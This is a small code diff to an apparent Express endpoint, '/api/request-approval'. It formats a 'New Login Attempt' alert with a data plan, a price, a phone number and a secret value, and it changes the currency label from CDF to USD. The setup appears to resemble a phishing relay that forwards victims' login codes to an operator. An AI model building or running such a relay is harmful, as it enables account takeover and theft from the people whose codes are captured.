@@ -83,7 +83,7 @@ app.post('/api/request-approval', async (req, res) => {
     const text =
       `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
       `📦 Data: ${plan || '—'}\n` +
-      `💰 Price: CDF ${price || '—'}\n` +
+      `💰 Price: USD ${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine;
       
